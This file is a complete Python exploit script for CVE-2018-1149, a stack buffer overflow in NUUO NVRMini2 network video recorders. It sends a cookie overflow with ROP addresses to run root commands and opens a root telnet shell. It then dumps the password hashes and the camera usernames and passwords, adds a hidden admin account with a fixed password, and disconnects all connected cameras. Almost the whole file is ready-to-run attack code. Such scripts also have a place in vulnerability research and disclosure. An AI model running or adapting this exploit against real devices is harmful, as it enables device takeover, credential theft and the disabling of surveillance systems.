import io
import sys
import socket
import pexpect
import requests
import configparser

##
# Exploit Title: NUUO NVRMini2 3.8 Disable Cameras
# Date: September 17, 2018
# Exploit Author: Jacob Baines
# Vendor Homepage: https://www.nuuo.com/
# Device: NRVMini2
# Software Link: https://www.nuuo.com/ProductNode.php?node=2
# Versions: 3.8.0 and below
# Tested Against: 03.07.0000.0011 and 03.08.0000.0005
# Tested on: Ubuntu and OSX
# CVE: CVE-2018-1149
# TRA: https://www.tenable.com/security/research/tra-2018-25
# Description:
#
# A stack buffer overflow exists in the cgi_system binary. The error occurs
# due to lack of bounds checking on the PHPSESSID value before and when
# it is passed to sprintf in order to generate the session id file name.
#
# As written, this exploit grabs the credentials to the cameras that are
# connected to the NVR, creates a hidden admin user, and disconnects any
# cameras that are currently connected to the NVR
###

##
# Quickly tries to grab the version of the target. If the target is
# using anything other than 3.7 or 3.8 then we'll bail out since
# haven't tested on any other targets
##
def check_target(ip, port):
    index = requests.get('http://' + ip + ':' + port + "/upgrade_handle.php?cmd=getcurrentinfo")
    return (index.text.find('<Titan>03.08') != -1 or index.text.find('<Titan>03.07') != -1)

##
# Executes a command via the stack buffer overflow in cookie parsing. The command
# is executed via 'system' as root. The overlow logic is like so:
#
# address 1: 405e2e34 - load system into r3 and address 2 into lr
#
# .text:000D0E34 0F 48 BD E8                 LDMFD   SP!, {R0-R3,R11,LR}
# .text:000D0E38 1E FF 2F E1                 BX      LR
#
# address 2: 406037cc - load the system command into r0. Jump to system.
#
# .text:000F17CC 0D 00 A0 E1                 MOV     R0, SP
# .text:000F17D0 33 FF 2F E1                 BLX     R3
#
# [   address 1  ][       r0     ][      r1      ][      r2      ][  r3 system   ][      r11     ][  LR - addr2  ][ system command ]
# \x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40touch /tmp/lolwat
##
def stack_buffer_overflow(command, ip, port):

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print '[+] Executing \033[92m%s\033[0m on %s:%s...' % (command, ip, port)
	sock.connect((ip, int(port)))
	exec_request = ('GET /cgi-bin/cgi_system?cmd=portCheck HTTP/1.1\r\n' +
	                'Host: ' + ip + ':' + port + '\r\n' +
	                'Accept: */*\r\n' +
	                'Cookie: PHPSESSID=982e6c010064b3878a4b793bfab8d2d2' +
	                'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDD' +
	                '\x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40' + command +
	                '\r\n\r\n')
	sock.sendall(exec_request)
	data = sock.recv(1024)
	sock.close()

	# We should get a 500 Internal error in response
	return data.find('500') != -1

##
# The first stage of the exploit opens up a telnet daemon. This function
# connects to the telnet port, gathers a bunch of information, and creates
# a hidden admin user. It also returns the list of connected cameras.
#
# This function kills off the telnet session upon success
##
def telnet_session(ip):

	print("Entering telnet session...")

	camera_array = []
	session = pexpect.spawn("telnet " + sys.argv[1])
	cli = session.expect("root@.*# ")
	if cli != 0:
		print("[-] Failed to establish a telnet session")
		sys.exit(0)

	print("[+] Searching for system users and password hashes...")
	session.sendline("cat /mtd/block4/NUUO/etc/access")
	session.readline() # read the echo
	session.expect("root@.*# ") # expect the new prompt

	users = [];
	access_array = session.before.splitlines();
	for user in access_array:
		name_end = user.find(";")
		if name_end != -1:
			users.append(user[:name_end])

	session.sendline("cat /mtd/block4/etc/shadow")
	session.readline() # read the echo
	session.expect("root@.*# ") # expect the new prompt

	shadow_lines = session.before.splitlines();
	for user in users:
		for shadow in shadow_lines:
			if (shadow.find(user) == 0):
				shadow_entry = shadow.split(':')
				print("\t- " + user + " " + shadow_entry[1])

	print("[+] Target System Information")
	session.sendline("cat /etc/titan.conf")
	session.readline() # read the echo
	session.expect("root@.*# ") # expect the new prompt

	titan_conf = configparser.RawConfigParser(allow_no_value=True)
	titan_conf.readfp(io.BytesIO(session.before))
	print("\t- NVR Version: " + titan_conf.get("Version", "NVR"))
	print("\t- NVR Release Date: " + titan_conf.get("Version", "NVRReleaseDate"))

	session.sendline("uname -a")
	session.readline() # read the echo
	session.expect("root@.*# ") # expect the new prompt

	uname_entries = session.before.split(" ")
	print("\t- Kernel: " + uname_entries[2])
	print("\t- Architecture: " + uname_entries[10])

	print("[+] Searching for remote cameras and creds...")
	session.sendline("cat /mtd/block4/NUUO/etc/camera.ini")
	session.readline() # read the echo
	session.expect("root@.*# ") # expect the new prompt

	camera_ini = configparser.RawConfigParser(allow_no_value=True)
	camera_ini.readfp(io.BytesIO(session.before))

	camera_index = 1
	for section in camera_ini.sections():
		if section.find("Camera") == 0: 
			# Active cameras should have this stuff set
			if not camera_ini.has_option(section, "Brandname"):
				continue
			if not camera_ini.has_option(section, "ModelName"):
				continue
			if not camera_ini.has_option(section, "Protocol"):
				continue
			if not camera_ini.has_option(section, "Channel"):
				continue
			if not camera_ini.has_option(section, "Password"):
				continue
			if not camera_ini.has_option(section, "UserName"):
				continue
			if not camera_ini.has_option(section, "Port"):
				continue
			if not camera_ini.has_option(section, "HostIP"):
				continue
			print("\t[" + str(camera_index) + "] " + camera_ini.get(section, "Brandname") + " "
						+ camera_ini.get(section, "ModelName") + " @ "
						+ camera_ini.get(section, "HostIP")
						+ ":" + camera_ini.get(section, "Port") + " ("
						+ camera_ini.get(section, "UserName") + ":"
						+ camera_ini.get(section, "Password") + ")")
			camera_array.append(camera_index)
			camera_index = camera_index + 1

	print("[+] Creating hidden admin user (cutv:iddqd)")
	session.sendline("echo \"cuttv;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16;1;1;1;1;1\" >> /mtd/block4/NUUO/etc/access")
	session.readline() # read the echo
	session.expect("root@.*# ") # expect the new prompt

	session.sendline("adduser cutv -h /tmp -s /sbin/nologin -D -H -G root")
	session.readline() # read the echo
	session.expect("root@.*# ") # expect the new prompt

	session.sendline("passwd -a md5 cutv")
	session.expect("New password:")
	session.sendline("iddqd")
	session.expect("Retype password:")
	session.sendline("iddqd")
	session.expect("root@.*# ") # expect the new prompt
	session.sendline("killall telnetd")
	return camera_array

##
# Log into the HTTP server using our hidden account and
# send the disconnect command to the cameras we identified
# before
##
def disable_cameras(camera_array, ip, port):
	print("[+] Logging in as admin user 'cutv'")
	disconnect = requests.Session()
	response = disconnect.post('http://' + ip + ':' + port + '/login.php', data={'language': 'en', 'user': 'cutv', 'pass': 'iddqd', 'submit': 'Login'})

	# response.status_code is always 200. durrr
	if (response.text.find("cmd=loginfail") != -1):
		print('[-] Login failed');
		sys.exit(0)

	print("[+] Login successful")
	for camera in camera_array:
		print("[+] Disabling camera " + str(camera))
		response = disconnect.post('http://' + ip + ':' + port + '/cgi-bin/cgi_main', data={'ChannelIndex': camera - 1, 'Command': 'DISCONN', 'cmd': 'status_update', 'xml': '1'})

if __name__ == "__main__":

	if (len(sys.argv) != 3):
		print "Usage: python cut.py <ipv4 address> <port>"
		sys.exit(1)

 	print("	  ______               __     __ ")
	print("	 /      \\             /  |   /  |")
	print("	/$$$$$$  | __    __  _$$ |_  $$ |")
	print("	$$ |  $$/ /  |  /  |/ $$   | $$ |")
	print("	$$ |      $$ |  $$ |$$$$$$/  $$ |")
	print("	$$ |   __ $$ |  $$ |  $$ | __$$/ ")
	print("	$$ \\__/  |$$ \\__$$ |  $$ |/  |__ ")
	print("	$$    $$/ $$    $$/   $$  $$//  |")
	print("	 $$$$$$/   $$$$$$/     $$$$/ $$/ ")
	print("")
	print("	Tested on NVRMini2 03.07.0000.0011")
	print("	Tested on NVRMini2 03.08.0000.0005")
	print("")

	ip = sys.argv[1]
	port = sys.argv[2]

	if int(port) > 65535:
		print('[-] Invalid port parameter')
		sys.exit(0)

	if len(ip.split('.')) != 4:
		print('[-] Invalid IP address parameter')
		sys.exit(0)

	if (check_target(ip, port) == False):
		print('[-] The target might not be an NVRMini2')
		sys.exit(0)

	if (stack_buffer_overflow('mount -t devpts devpts /dev/pts', ip, port) == False):
		print('[-] Mount failed')
		sys.exit(0)

	if (stack_buffer_overflow('/bin/sh -c "/usr/sbin/telnetd -l /bin/bash -b 0.0.0.0"&', ip, port) == False):
		print('[-] telnetd bind failed')
		sys.exit(0)

	camera_array = telnet_session(ip)
	if len(camera_array) == 0:
		print '[!] There are no active cameras to disconnect'
		sys.exit(0)

	disable_cameras(camera_array, ip, port)
	print("[+] Complete!")
